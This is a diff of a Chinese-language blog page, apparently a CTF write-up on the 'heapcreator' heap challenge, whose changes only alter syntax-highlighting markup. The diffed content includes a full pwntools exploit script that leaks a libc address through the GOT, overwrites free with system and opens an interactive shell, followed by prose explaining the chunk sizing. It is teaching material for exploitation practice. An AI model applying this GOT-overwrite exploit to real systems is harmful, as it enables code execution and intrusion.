@@ -274,7 +274,7 @@ Fastbins[idx=6, size=0x70] 0x00
     NX:       NX enabled
     PIE:      No PIE
 </code></pre></div></div>
-<p>全局维护一个<code class="highlighter-rouge">heaparray[10]</code>，可以存放10个地址。
+<p>全局维护一个<code class="language-plaintext highlighter-rouge">heaparray[10]</code>，可以存放10个地址。
 这个大概的功能如下：</p>
 
 <h4 id="create">create</h4>
@@ -463,39 +463,39 @@ Fastbins[idx=6, size=0x70] 0x00
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./heapcreator"</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./heapcreator"</span><span class="p">)</span>
 
-<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
-<span class="n">free_libc_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'free'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_libc_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_libc_addr</span><span class="p">))</span>
-<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_libc_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">))</span>
+<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
+<span class="n">free_libc_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'free'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_libc_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_libc_addr</span><span class="p">))</span>
+<span class="n">system_libc_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system_libc_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc_addr</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"SuccessFul"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Creat success!"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"SuccessFul"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Creat success!"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Edit success!"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Edit success!"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Delete success!"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Done !"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Delete success!"</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
     <span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s">'aaaa'</span><span class="p">)</span>
@@ -508,9 +508,9 @@ Fastbins[idx=6, size=0x70] 0x00
     <span class="n">content</span> <span class="o">=</span> <span class="s">'deadbeef'</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span>
     <span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
     <span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Content : "</span><span class="p">)</span>
-    <span class="n">free_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_addr</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Content : "</span><span class="p">)</span>
+    <span class="n">free_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"free_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_addr</span><span class="p">))</span>
 
     <span class="n">offset</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">free_libc_addr</span>
     <span class="n">system_addr</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">system_libc_addr</span>
@@ -518,7 +518,7 @@ Fastbins[idx=6, size=0x70] 0x00
     <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
-    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p>这里我们来分析一下这个脚本，首先create了一个0x18的size，这个有什么讲究吗？<br />
 答案是显然的，上面我们提到64位时，chunk地址是16字节对齐的，因此我们需要对其调试来确定第一个chunk的size。假如我们申请0x10的size，则heap是这样的：</p>
